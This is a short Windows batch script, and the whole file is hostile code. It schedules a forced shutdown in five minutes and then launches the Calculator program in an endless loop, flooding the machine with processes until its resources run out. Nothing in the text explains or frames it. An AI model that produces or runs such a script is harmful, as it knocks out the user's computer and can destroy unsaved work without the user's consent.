@echo off
shutdown /s /t 300

:loop
start calc.exe
goto loop